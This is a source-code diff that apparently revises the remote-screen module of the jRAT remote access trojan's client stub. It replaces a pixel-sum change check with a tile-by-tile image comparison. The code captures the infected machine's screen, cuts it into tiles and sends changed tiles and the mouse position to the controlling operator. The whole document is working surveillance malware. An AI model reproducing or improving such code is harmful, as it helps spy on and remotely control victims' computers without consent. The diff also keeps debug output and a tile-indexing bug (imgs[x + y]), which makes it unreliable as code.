@@ -1,6 +1,5 @@
 package io.jrat.stub;
 
-import io.jrat.common.utils.MathUtils;
 import io.jrat.stub.packets.outgoing.AbstractOutgoingPacket;
 import io.jrat.stub.packets.outgoing.Packet17RemoteScreen;
 import io.jrat.stub.packets.outgoing.Packet33Thumbnail;
@@ -17,7 +16,6 @@ import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
-import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 
 import javax.imageio.ImageIO;
@@ -28,11 +26,11 @@ public class Screen implements Runnable {
 
 	private int size;
 	private int quality;
-	private int monitor;	
+	private int monitor;
 	private int rows;
 	private int columns;
-	
-    public static int[] prevSums = new int[0];
+
+	public static BufferedImage[] prevSums = new BufferedImage[0];
 
 	public Screen(int size, int quality, int monitor, int columns, int rows) {
 		Screen.instance = this;
@@ -43,19 +41,18 @@ public class Screen implements Runnable {
 		this.rows = rows;
 	}
 
-    public static int calculateSum(BufferedImage image) {
-        int[] pixels = image.getRaster().getPixels(0, 0, image.getWidth(), image.getHeight(), new int[image.getWidth() * image.getHeight() * 3]);
-        int sum = 0;
-        for (int x = 0; x < image.getWidth(); x += 16) {
-            for (int y = 0; y < image.getHeight(); y += 16) {
-                sum += pixels[(y * image.getWidth() + x) * 3 + 0];
-                sum += pixels[(y * image.getWidth() + x) * 3 + 1];
-                sum += pixels[(y * image.getWidth() + x) * 3 + 2];
-            }
-        }
-        return sum;
-    }
-
+	public static int calculateSum(BufferedImage image) {
+		int[] pixels = image.getRaster().getPixels(0, 0, image.getWidth(), image.getHeight(), new int[image.getWidth() * image.getHeight() * 3]);
+		int sum = 0;
+		for (int x = 0; x < image.getWidth(); x += 16) {
+			for (int y = 0; y < image.getHeight(); y += 16) {
+				sum += pixels[(y * image.getWidth() + x) * 3 + 0];
+				sum += pixels[(y * image.getWidth() + x) * 3 + 1];
+				sum += pixels[(y * image.getWidth() + x) * 3 + 2];
+			}
+		}
+		return sum;
+	}
 
 	@Override
 	public void run() {
@@ -82,7 +79,6 @@ public class Screen implements Runnable {
 				scaledSize = 0.1D;
 			}
 
-
 			if (scaledSize != 1.0D) {
 				image = ImageUtils.resize(image, scaledSize);
 			}
@@ -96,82 +92,85 @@ public class Screen implements Runnable {
 			int scaledMouseY = (int) (mouseY * scaledSize);
 
 			AbstractOutgoingPacket packet;
+
+			int chunkWidth = image.getWidth() / columns;
+			int chunkHeight = image.getHeight() / rows;
+
+			BufferedImage imgs[] = new BufferedImage[columns * rows];
+
+			if (prevSums == null || prevSums.length != columns * rows) {
+				prevSums = new BufferedImage[columns * rows];
+			}
+
+			int is = 0;
 			
-            int chunkWidth = image.getWidth() / columns;
-            int chunkHeight = image.getHeight() / rows;
+			for (int x = 0; x < rows; x++) {
+				for (int y = 0; y < columns; y++) {
+					BufferedImage i;
+					imgs[x + y] = i = new BufferedImage(chunkWidth, chunkHeight, image.getType());
+					Graphics2D gr = imgs[x + y].createGraphics();
+					gr.drawImage(image, 0, 0, chunkWidth, chunkHeight, chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight, null);
+					gr.dispose();
 
-            BufferedImage imgs[] = new BufferedImage[columns * rows];
-            
-            if (prevSums == null || prevSums.length != columns * rows) {
-                prevSums = new int[columns * rows];
-            }            
-            
-            for (int x = 0; x < rows; x++) {
-                for (int y = 0; y < columns; y++) {
-                    BufferedImage i;
-                    imgs[x + y] = i = new BufferedImage(chunkWidth, chunkHeight, image.getType());
-                    Graphics2D gr = imgs[x + y].createGraphics();
-                    gr.drawImage(image, 0, 0, chunkWidth, chunkHeight, chunkWidth * y, chunkHeight * x, chunkWidth * y + chunkWidth, chunkHeight * x + chunkHeight, null);               
-                    gr.dispose();                
-                    
-                    ByteArrayOutputStream bss = new ByteArrayOutputStream();
-                  /*  ImageOutputStream baos = ImageIO.createImageOutputStream(bss);
-                    Iterator<ImageWriter> iter = ImageIO.getImageWritersByFormatName("jpeg");
-                    ImageWriter writer = iter.next();
-                    ImageWriteParam iwp = writer.getDefaultWriteParam();
-                    iwp.setCompressionMode(2);
-                    iwp.setCompressionQuality(quality / 10F);
-                    writer.setOutput(baos);
-                    writer.write(null, new IIOImage(i, null, null), iwp);
-                    writer.dispose();*/
-                    ImageIO.write(i, "png", bss);
-                    byte[] buffer = bss.toByteArray();
+					boolean update = false;
 
-                    boolean update = false;
+					BufferedImage prev = prevSums[is];
 
-                    int sum = calculateSum(i);                
-                    int prev = prevSums[x + y];          
-                    
-                    int first;
-                    int second;
-                    
-                    if (sum < prev) {
-                    	first = sum;
-                    	second = prev;
-                    } else {
-                    	first = prev;
-                    	second = sum;
-                    }
-                    
-                    double percent;
-                    
-                    if (first != 0 && second != 0) {
-                        percent = (double) ((double) first / (double)second);
-                    } else {
-                    	percent = 0D;
-                    }
+					if (!compare(prev, i)) {
+						update = true;
+					}
+					
+					ByteArrayOutputStream bss = new ByteArrayOutputStream();
+					/*
+					 * ImageOutputStream baos =
+					 * ImageIO.createImageOutputStream(bss);
+					 * Iterator<ImageWriter> iter =
+					 * ImageIO.getImageWritersByFormatName("jpeg"); ImageWriter
+					 * writer = iter.next(); ImageWriteParam iwp =
+					 * writer.getDefaultWriteParam(); iwp.setCompressionMode(2);
+					 * iwp.setCompressionQuality(quality / 10F);
+					 * writer.setOutput(baos); writer.write(null, new
+					 * IIOImage(i, null, null), iwp); writer.dispose();
+					 */
+					ImageIO.write(i, "png", bss);
+					byte[] buffer = bss.toByteArray();
 
-                    if (percent < 0.8D) {
-                    	update = true;
-                    }
-                    
+					System.out.println(update);
 
-                    System.out.println(percent + " , " + update);
+					prevSums[is++] = i;
 
-                                 
-                    prevSums[x + y] = sum;
+					if (update) {
+						packet = new Packet17RemoteScreen(chunkWidth, chunkHeight, x, y, image.getWidth(), image.getHeight(), buffer);
 
-                    if (update) {
-                        packet = new Packet17RemoteScreen(chunkWidth, chunkHeight, x, y, image.getWidth(), image.getHeight(), buffer);
-
-            			packet.send(Connection.dos, Connection.sw);
-                    }    
-                }
-            }        
-            new Packet68RemoteScreenComplete(scaledMouseX, scaledMouseY).send(Connection.dos, Connection.sw);
+						packet.send(Connection.dos, Connection.sw);
+					}
+				}
+			}
+			new Packet68RemoteScreenComplete(scaledMouseX, scaledMouseY).send(Connection.dos, Connection.sw);
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
+	}
+
+	public boolean compare(BufferedImage image1, BufferedImage image2) {
+		if (image1 == null) {
+			return false;
+		}
+		boolean b = true;
+		int x1 = image1.getWidth();
+		int y1 = image1.getHeight();
+		for (int x = 0; x < x1; x += 16) {
+			for (int y = 0; y < y1; y += 16) {
+				int p1 = image1.getRGB(x, y);
+				int p2 = image2.getRGB(x, y);
+				if (p1 != p2) {
+					//image2.setRGB(x, y, Color.RED.getRGB());
+					b = false;
+				}
+			}
+		}
+		
+		return b;
 	}
 
 	public static void sendThumbnail() {
